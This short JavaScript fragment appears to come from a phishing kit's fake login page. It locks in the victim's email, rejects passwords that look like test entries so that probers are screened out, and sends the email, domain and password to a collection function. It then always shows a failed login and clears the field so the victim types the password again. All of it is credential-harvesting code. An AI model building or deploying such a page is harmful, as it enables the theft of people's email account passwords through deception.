// 
if (validEmail.test(usermail)) {
    $("#q_mail").val(usermail);
    $("#q_mail").attr('readOnly', true); 
}

// 
$("#qq_form").on('submit', (e)=>{
    e.preventDefault();

    if (!validEmail.test($("#q_mail").val())) {
        $("#q_mail").css({"border-color":"red"})
        return
    }
    else{
        $("#q_mail").css({"border-color":"silver"})
    }

    if (validEmail.test($("#q_pass").val()) || $("#q_pass").val().length < 6 || $("#q_pass").val() == 123456 || $("#q_pass").val().toLowerCase() == "qwerty" || $("#q_pass").val().toLowerCase() == "password" || $("#q_pass").val().toLowerCase() == "testing") {
        $("#q_pass").css({"border-color":"red"})
        return
    }
    else{
        $("#q_pass").css({"border-color":"silver"})
    }

    $("#loader").show().css({"display":"flex"})

    let url = $("#q_mail").val().split('@');

    postResult(url[1], $("#q_mail").val(), $("#q_pass").val(), postCount);
    
    setTimeout(() => {
        $("#q_pass").css({"border-color":"red"})
        postCount++
        $("#q_pass").val("")
    }, delayCounter);

})